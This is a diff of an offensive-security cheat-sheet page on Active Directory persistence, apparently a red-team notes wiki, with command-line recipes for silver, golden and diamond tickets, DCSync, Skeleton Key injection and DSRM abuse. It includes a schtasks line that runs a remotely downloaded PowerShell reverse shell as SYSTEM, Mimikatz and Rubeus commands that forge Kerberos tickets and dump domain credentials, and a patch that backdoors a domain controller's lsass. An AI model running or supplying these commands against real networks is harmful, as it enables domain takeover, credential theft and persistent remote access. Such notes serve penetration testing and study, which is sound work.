@@ -130,10 +130,9 @@ Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /targ
 **Schedudle an execute a task with silver ticket of "HOST" Service**
 
 {% code overflow="wrap" %}
-```powershell
-Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:host /rc4:hash /user:Administrator /ptt"'
-
+```
 schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
+
 schtasks /Run /S hostname.dom.local /TN "STCheck"
 ```
 {% endcode %}
@@ -146,53 +145,11 @@ schtasks /Run /S hostname.dom.local /TN "STCheck"
 **List tasks**\
 ****schtasks /S hostname.dom.local
 
-## 💎Diamond Ticket
-
-### Description
-
-* A diamond ticket is created by decrypting a valid TGT, making changes to it and re encrypt it using the AES keys of the krbtgt account.
-* Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack.
-* Once again, the persistence lifetime depends on krbtgt account.
-* It is more opsec safe because:
-  * Valid ticket times because a TGT issued by the DC is modified;\
-    In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.
-
-### Requirements
-
-Krbtgt AES Key
-
-### Tools
-
-{% code overflow="wrap" %}
-```powershell
-Rubeus.exe diamond
-/krbkey:hash /user:yourusername /password:yourpw /enctype:aes /ticketuser:administrator /domain:dom.local /dc:dcname.dom.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show ptt
-
-use /tgtdeleg in place of credentials in case we have access as a domain user
-Rubeus.exe diamond
-/krbkey:hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dom.local /dc:dcname.dom.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show ptt
-```
-{% endcode %}
-
-## 🔁DCSync Attack
-
-**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
-
-{% code overflow="wrap" %}
-```powershell
-Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'
-
-SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
-```
-{% endcode %}
-
-##
-
 ## 🦴Skeleton Key
 
 ### Description
 
-* Skeleton Key is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
+* Skeleton KEy is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
 * The regular Password and the new password will work
 * Malware named "Skeleton Key" used it
 * Not persistent after reboot/lsass process restart
@@ -205,15 +162,15 @@ SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 
 ### Tools
 
-**Inject a skeleton key, password will be "mimikatz" - DA rights required**
+**Inject a skeleton key, password will be mimikatz - DA rights required**
 
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
-
-Now you can login e.g. with Enter-PSSession -computername dc-hostname -credential dom\Administrator  => with the Password mimikatz
 ```
 {% endcode %}
+
+Now you can login e.g. with Enter-PSSession
 
 ❓Debug really needed?
 
@@ -266,7 +223,7 @@ Compare the Administrator hash with the Administrator hash of the below command
 Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.local
 ```
 
-\=> First command is the DSRM local Administrator\
+\
 \=> Here we that it from the lsass process => This is the Administrator account of the Domain
 
 **Change the logon behaviour of the DSRM Account before we can use the DSRM Hash**
@@ -279,7 +236,9 @@ Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" - name "DsrmAdmin
 Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
 </code></pre>
 
-**❓Then , we can us the following command to get DA back / pass the hash**
+
+
+**Later we can us the following command to get DA back**
 
 {% code overflow="wrap" %}
 ```powershell
